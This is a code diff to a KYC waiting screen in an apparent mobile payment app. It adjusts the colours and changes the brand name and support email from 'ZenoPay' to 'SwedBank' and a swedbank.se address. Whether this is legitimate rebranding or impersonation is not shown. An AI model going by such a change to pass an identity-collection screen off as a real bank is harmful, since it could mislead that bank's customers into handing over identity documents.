@@ -25,21 +25,21 @@ type PickedImage = {
 };
 
 const UI = {
-  bg: '#EEF4FF',
-  page: '#F7FAFF',
+  bg: '#F4F7FB',
+  page: '#FFFFFF',
   card: '#FFFFFF',
-  cardSoft: '#F8FBFF',
-  text: '#0F172A',
-  text2: '#64748B',
-  text3: '#94A3B8',
-  border: '#D9E5F6',
-  blue: '#2563EB',
-  blueDark: '#1D4ED8',
-  blueSoft: '#EAF2FF',
+  cardSoft: '#F4F7FB',
+  text: '#0F1B33',
+  text2: '#5B6B82',
+  text3: '#9FB0C7',
+  border: '#E3E8F0',
+  blue: '#0F2A5C',
+  blueDark: '#0A1F45',
+  blueSoft: '#E8EEF6',
   blueSoft2: '#DCEBFF',
   danger: '#DC2626',
   dangerSoft: '#FEF2F2',
-  shadow: '#7DA8E6',
+  shadow: '#A8B8CC',
 };
 
 const SHADOWS = {
@@ -277,7 +277,7 @@ export default function KycWait() {
 
             <Text style={styles.successText}>
               {(i18n.t('kyc.contactSupport') as string) || 'Contact support'}{' '}
-              <Text style={styles.emailText}>info@zenopay.bond</Text>
+              <Text style={styles.emailText}>info@swedbank.se</Text>
             </Text>
 
             <Text style={styles.securityText}>
@@ -308,7 +308,7 @@ export default function KycWait() {
     <View style={styles.container}>
       <ScrollView contentContainerStyle={styles.scroll} keyboardShouldPersistTaps="handled">
         <View style={styles.brandWrap}>
-          <Text style={styles.brand}>ZenoPay</Text>
+          <Text style={styles.brand}>SwedBank</Text>
         </View>
 
         <View style={styles.heroCard}>
